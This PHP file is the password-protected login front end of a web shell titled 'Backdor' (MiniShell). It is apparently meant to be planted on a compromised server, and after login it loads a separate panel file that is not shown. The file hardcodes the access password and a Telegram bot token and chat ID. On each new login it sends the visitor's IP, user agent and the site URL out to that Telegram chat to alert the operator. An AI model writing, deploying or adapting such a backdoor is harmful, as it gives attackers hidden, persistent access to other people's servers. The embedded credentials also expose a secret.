<?php
session_start();

$password = "puki";

function sendTelegramNotification() {
    $botToken = "7940404768:AAGNTcNtiFbc5H_ZfkPLm-g1Sy2ywsjDbSo";
    $chatId = "-4794875087";
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $msg = "MiniShell Login Success\nIP: $ip\nUser-Agent: $userAgent\nURL: $url";
    @file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
}

function shouldNotifyIP($ip, $cooldown = 3600) {
    $logFile = __DIR__ . '/ip_log.txt';
    $currentTime = time();
    if (!file_exists($logFile)) return true;

    $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $newLines = [];
    $shouldNotify = true;

    foreach ($lines as $line) {
        list($loggedIp, $timestamp) = explode('|', $line);
        if ($currentTime - (int)$timestamp < $cooldown) {
            $newLines[] = $line;
            if ($loggedIp === $ip) {
                $shouldNotify = false;
            }
        }
    }

    if ($shouldNotify) {
        $newLines[] = "$ip|$currentTime";
        if (count($newLines) > 100) {
            $newLines = array_slice($newLines, -100);
        }
        file_put_contents($logFile, implode("\n", $newLines) . "\n");
    }

    return $shouldNotify;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['logged_in'] = true;
        if (shouldNotifyIP($_SERVER['REMOTE_ADDR'])) {
            sendTelegramNotification();
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }

    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>𝐁𝐚𝐜𝐤𝐝𝐨𝐫</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        html, body { margin: 0; padding: 0; overflow: hidden; height: 100%; background-color: #111827; }
        canvas { position: fixed; top: 0; left: 0; z-index: 0; }
        .login-container { position: relative; z-index: 10; background-color: rgba(31, 41, 55, 0.6); backdrop-filter: blur(8px); }
        .transparent-input { background-color: rgba(255, 255, 255, 0.1); backdrop-filter: blur(4px); }
    </style>
</head>
<body class="text-white font-mono flex items-center justify-center min-h-screen">
    <canvas id="network"></canvas>
    <div class="login-container max-w-4xl w-full p-10 px-20 rounded shadow-lg border border-gray-700">
        <h1 class="text-5xl mb-10 font-bold text-red-500 text-center">𝐁𝐚𝐜𝐤𝐝𝐨𝐫</h1>
        <form method="POST">
            <input type="password" name="pass" placeholder="Enter Password"
                class="w-full p-6 rounded text-white text-3xl mb-6 border border-gray-400 focus:outline-none transparent-input placeholder-white" required />
            <button type="submit"
                class="w-full text-3xl py-4 px-8 rounded border border-green-800 text-green-200 hover:bg-green-600 transition bg-transparent backdrop-blur-sm">
                Login
            </button>
        </form>
    </div>
    <script>
        const canvas = document.getElementById("network");
        const ctx = canvas.getContext("2d");
        let width, height;
        let points = [];

        function resize() {
            width = window.innerWidth;
            height = window.innerHeight;
            canvas.width = width;
            canvas.height = height;
        }

        window.addEventListener("resize", resize);
        resize();

        const POINTS_COUNT = 200;
        for (let i = 0; i < POINTS_COUNT; i++) {
            points.push({
                x: Math.random() * width,
                y: Math.random() * height,
                vx: (Math.random() - 0.5) * 0.7,
                vy: (Math.random() - 0.5) * 0.7
            });
        }

        function distance(p1, p2) {
            return Math.sqrt((p1.x - p2.x)**2 + (p1.y - p2.y)**2);
        }

        function animate() {
            ctx.clearRect(0, 0, width, height);
            ctx.fillStyle = "rgba(255,255,255,0.8)";
            points.forEach(p => {
                ctx.beginPath();
                ctx.arc(p.x, p.y, 5, 0, Math.PI * 2);
                ctx.fill();
            });
            ctx.strokeStyle = "rgba(255,255,255,0.3)";
            ctx.lineWidth = 1.8;
            for (let i = 0; i < POINTS_COUNT; i++) {
                for (let j = i + 1; j < POINTS_COUNT; j++) {
                    let dist = distance(points[i], points[j]);
                    if (dist < 130) {
                        ctx.beginPath();
                        ctx.moveTo(points[i].x, points[i].y);
                        ctx.lineTo(points[j].x, points[j].y);
                        ctx.stroke();
                    }
                }
            }
            points.forEach(p => {
                p.x += p.vx;
                p.y += p.vy;
                if (p.x < 0 || p.x > width) p.vx *= -1;
                if (p.y < 0 || p.y > height) p.vy *= -1;
            });
            requestAnimationFrame(animate);
        }

        animate();
    </script>
</body>
</html>';
    exit;
}

// Panel utama dimuat di file terpisah atau bagian bawah
include "panel_main.php";
